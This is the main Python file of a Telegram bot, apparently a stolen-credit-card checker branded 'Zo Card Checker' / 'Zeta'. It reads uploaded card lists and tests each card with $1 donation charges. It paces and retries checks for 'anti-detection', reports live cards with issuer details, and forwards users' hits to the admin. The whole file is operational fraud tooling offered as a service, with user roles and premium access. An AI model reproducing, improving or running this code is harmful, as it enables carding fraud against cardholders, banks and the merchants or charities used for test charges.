import os
import time
import threading
import asyncio
import requests
import random
from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
from config import *
from utils import *
from payment_handler import *

current_processing = {}

# Zeta fucking configuration - 3 minutes between checks
ZETA_DELAY_BETWEEN_CHECKS = 180  # 3 fucking minutes
ZETA_MAX_RETRIES = 3
ZETA_RETRY_DELAY = 30  # 30 seconds between retries

async def send_tele(chat_id, message):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    params = {'chat_id': chat_id, 'text': message}
    
    try:
        response = requests.get(url, params=params, timeout=10)
        return response.status_code == 200
    except:
        return False

async def send_enhanced_hit_to_admin(card, user_info, response_text, bin_info, user_role, vbv_status):
    if "CCN" in response_text:
        hit_message = f"🟡 **CCN FOUND BY USER** 🟡\n\n"
    elif "Insufficient" in response_text:
        hit_message = f"🟠 **INSUFFICIENT FUNDS BY USER** 🟠\n\n"
    elif "LIVE" in response_text:
        hit_message = f"🟢 **CVV LIVE BY USER** 🟢\n\n"
    else:
        hit_message = f"🎯 **HIT FOUND BY USER** 🎯\n\n"
    
    hit_message += f"**Card:** `{card}`\n"
    hit_message += f"**Response:** {response_text}\n"
    hit_message += f"**Amount:** $1.00\n"
    hit_message += f"**VBV Status:** {vbv_status}\n\n"
    
    hit_message += f"**Issuer:**\n"
    hit_message += f"{bin_info['bank']}, {bin_info['brand']}, {bin_info['type']}\n"
    hit_message += f"{bin_info['country']}\n\n"
    
    hit_message += f"**User:** {user_role}\n"
    hit_message += f"**User ID:** `{user_info['id']}`\n"
    hit_message += f"**Time:** {time.strftime('%Y-%m-%d %H:%M:%S')}\n\n"
    
    hit_message += f"**Bot By:** @DoubleT2245"
    
    await send_tele(ADMIN_ID, hit_message)

async def send_enhanced_progress(chat_id, session, current_card, response_text, bin_info, vbv_status, user_info=None):
    progress = (session['processed'] / session['total']) * 100 if session['total'] > 0 else 0
    progress = round(progress, 2)
    
    user_role = get_user_role(chat_id)
    
    # ONLY send messages for these statuses - NO DECLINED MESSAGES
    if "CCN" in response_text:
        message = f"🟡 **CCN FOUND** 🟡\n\n"
        message += f"💳 Card: `{current_card}`\n"
        message += f"📡 Response: {response_text}\n"
        message += f"💰 Amount: $1.00\n"
        message += f"🔐 VBV: {vbv_status}\n\n"
    elif "Insufficient" in response_text:
        message = f"🟠 **INSUFFICIENT FUNDS** 🟠\n\n"
        message += f"💳 Card: `{current_card}`\n"
        message += f"📡 Response: You Balance Is Lower Than $1.00\n"
        message += f"💰 Amount: $1.00\n"
        message += f"🔐 VBV: {vbv_status}\n\n"
    elif "LIVE" in response_text:
        message = f"🟢 **CVV LIVE** 🟢\n\n"
        message += f"💳 Card: `{current_card}`\n"
        message += f"📡 Response: {response_text}\n"
        message += f"💰 Amount: $1.00\n"
        message += f"🔐 VBV: {vbv_status}\n\n"
    else:
        # DON'T send message for declined/other statuses
        return
    
    message += f"🏦 **Issuer:**\n"
    message += f"{bin_info['bank']}, {bin_info['brand']}, {bin_info['type']}\n"
    message += f"{bin_info['country']}\n\n"
    
    message += f"📊 PROGRESS : {progress}% ({session['processed']}/{session['total']})\n"
    message += f"✔ LIVE : {session['live']}\n"
    message += f"✔ INSUFFICIENT : {session['insufficient']}\n"
    message += f"✔ CCN : {session['ccn']}\n"
    message += f"✔ HIT : {session['hit']}\n\n"
    
    message += f"⏰ Next check in: {ZETA_DELAY_BETWEEN_CHECKS//60} minutes\n"
    message += f"{user_role}\n"
    message += "🤖 BOT BY : @DoubleT2245"
    
    await send_tele(chat_id, message)
    
    # Auto send hit to admin only for these statuses
    if user_info and not is_admin(chat_id) and any(x in response_text for x in ["LIVE", "CCN", "Insufficient"]):
        await send_enhanced_hit_to_admin(current_card, user_info, response_text, bin_info, user_role, vbv_status)
        
        users = load_users()
        user_id_str = str(chat_id)
        if user_id_str in users:
            users[user_id_str]['hits_found'] = users[user_id_str].get('hits_found', 0) + 1
            save_users(users)

def zeta_retry_operation(operation, max_retries=ZETA_MAX_RETRIES, delay=ZETA_RETRY_DELAY):
    """Zeta-style retry with exponential backoff"""
    for attempt in range(max_retries):
        try:
            return operation()
        except Exception as e:
            if attempt == max_retries - 1:
                raise e
            time.sleep(delay * (attempt + 1))
    return None

def process_card_file(chat_id, file_path):
    try:
        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            lines = f.readlines()
        
        session = load_session()
        session['total'] = len(lines)
        session['processed'] = 0
        session['live'] = 0
        session['insufficient'] = 0
        session['hit'] = 0
        session['ccn'] = 0
        session['current_file'] = file_path
        save_session(session)
        
        users = load_users()
        user_info = users.get(str(chat_id), {'id': str(chat_id), 'username': 'Unknown', 'joined': 'Unknown'})
        
        asyncio.run(send_tele(chat_id, f"🚀 Starting Zeta check on {session['total']} cards..."))
        asyncio.run(send_tele(chat_id, f"⏰ Delay: {ZETA_DELAY_BETWEEN_CHECKS//60} minutes between checks"))
        asyncio.run(send_tele(chat_id, f"🛡️ Anti-detection: {ZETA_MAX_RETRIES} retries on failure"))
        
        for i, line in enumerate(lines):
            if chat_id in current_processing and not current_processing[chat_id]:
                break
                
            card = line.strip()
            if not card:
                continue
                
            parts = card.split('|')
            if len(parts) < 4:
                continue
                
            cc_no, month, year, cvv = [part.strip() for part in parts[:4]]
            
            # Zeta retry mechanism for payment
            try:
                payment_result = zeta_retry_operation(lambda: payment(card, cc_no, month, year, cvv))
                vbv_status = payment_result[2] if payment_result and len(payment_result) > 2 else "VBV - Unknown"
            except Exception as e:
                asyncio.run(send_tele(chat_id, f"❌ Payment failed after {ZETA_MAX_RETRIES} retries: {str(e)}"))
                session['processed'] += 1
                save_session(session)
                continue
            
            if payment_result and payment_result[0]:
                random_info = random_user_info()
                if random_info[0]:
                    # Zeta retry mechanism for donate
                    try:
                        donate_result = zeta_retry_operation(lambda: enhanced_donate(card, payment_result[1], random_info[1], random_info[2], vbv_status))
                        vbv_status = donate_result[5] if donate_result and len(donate_result) > 5 else vbv_status
                    except Exception as e:
                        asyncio.run(send_tele(chat_id, f"❌ Donate failed after {ZETA_MAX_RETRIES} retries: {str(e)}"))
                        session['processed'] += 1
                        save_session(session)
                        continue
                    
                    if donate_result and donate_result[0]:
                        if donate_result[1] == "live":
                            session['live'] += 1
                            session['hit'] += 1
                            response_text = f"LIVE - {donate_result[2]}"
                        elif donate_result[1] == "ccn":
                            session['ccn'] += 1
                            response_text = f"CCN - {donate_result[2]}"
                        elif donate_result[1] == "insufficient":
                            session['insufficient'] += 1
                            response_text = "Insufficient Funds"
                    else:
                        # Declined cards - DON'T send message
                        response_text = f"Declined - {donate_result[2] if donate_result else 'Unknown'}"
                        session['processed'] += 1
                        save_session(session)
                        
                        # Wait before next card
                        if i < len(lines) - 1:
                            time.sleep(ZETA_DELAY_BETWEEN_CHECKS)
                        continue
                else:
                    # Random gen failed - DON'T send message
                    response_text = "Random Gen Failed"
                    session['processed'] += 1
                    save_session(session)
                    
                    # Wait before next card
                    if i < len(lines) - 1:
                        time.sleep(ZETA_DELAY_BETWEEN_CHECKS)
                    continue
            else:
                # Payment failed - DON'T send message
                response_text = payment_result[1] if payment_result else "Payment Failed"
                session['processed'] += 1
                save_session(session)
                
                # Wait before next card
                if i < len(lines) - 1:
                    time.sleep(ZETA_DELAY_BETWEEN_CHECKS)
                continue
            
            session['processed'] += 1
            save_session(session)
            
            bin_info = get_bin_info(cc_no)
            
            # This function will only send messages for LIVE, CCN, INSUFFICIENT
            asyncio.run(send_enhanced_progress(chat_id, session, card, response_text, bin_info, vbv_status, user_info))
            
            # Zeta delay between checks - 3 fucking minutes
            if i < len(lines) - 1:
                asyncio.run(send_tele(chat_id, f"⏰ Waiting {ZETA_DELAY_BETWEEN_CHECKS//60} minutes for next check..."))
                time.sleep(ZETA_DELAY_BETWEEN_CHECKS)
        
        final_message = f"✅ ZETA CHECK COMPLETED!\nProcessed: {session['processed']} cards\nLIVE: {session['live']}\nINSUFFICIENT: {session['insufficient']}\nCCN: {session['ccn']}\nHIT: {session['hit']}\n\n👑 ALPHA COMMAND EXECUTED SUCCESSFULLY"
        asyncio.run(send_tele(chat_id, final_message))
        
        if chat_id in current_processing:
            del current_processing[chat_id]
            
    except Exception as e:
        asyncio.run(send_tele(chat_id, f"❌ Zeta processing error: {str(e)}"))
        if chat_id in current_processing:
            current_processing[chat_id] = False

# ... rest of the code remains the same (start_command, help_command, etc.)

async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    username = update.effective_user.username or ""
    
    if not can_use_bot(user_id):
        await update.message.reply_text("❌ You don't have permission to use this bot.\n\nContact admin to get access.")
        return
    
    add_user(user_id, username)
    
    user_role = get_user_role(user_id)
    
    welcome_text = f"🔄 Zo Card Checker Activated - ZETA MODE\n\n👤 {user_role}\n⏰ Delay: {ZETA_DELAY_BETWEEN_CHECKS//60} minutes between checks\n🛡️ Retries: {ZETA_MAX_RETRIES} on failure\n\nSend me a .txt file with cards to start checking!\n\nCommands:\n/status - Check progress\n/help - Show help"
    await update.message.reply_text(welcome_text)

def main():
    app = Application.builder().token(BOT_TOKEN).build()
    
    # Command handlers
    app.add_handler(CommandHandler("start", start_command))
    app.add_handler(CommandHandler("help", help_command))
    app.add_handler(CommandHandler("status", status_command))
    app.add_handler(CommandHandler("stop", stop_command))
    
    # User management commands
    app.add_handler(CommandHandler("addproxy", addproxy_command))
    app.add_handler(CommandHandler("ban", ban_command))
    app.add_handler(CommandHandler("unban", unban_command))
    app.add_handler(CommandHandler("adduser", adduser_command))
    app.add_handler(CommandHandler("setpremium", setpremium_command))
    app.add_handler(CommandHandler("removeuser", removeuser_command))
    app.add_handler(CommandHandler("users", users_command))
    app.add_handler(CommandHandler("hits", hits_command))
    
    # Document handler
    app.add_handler(MessageHandler(filters.Document.ALL, handle_document))
    
    print("🤖 Zeta Bot is running with enhanced timing and retry mechanisms...")
    print(f"⏰ Delay: {ZETA_DELAY_BETWEEN_CHECKS//60} minutes between checks")
    print("🛡️ Anti-detection: Retry system activated")
    app.run_polling()

if __name__ == '__main__':
    main()
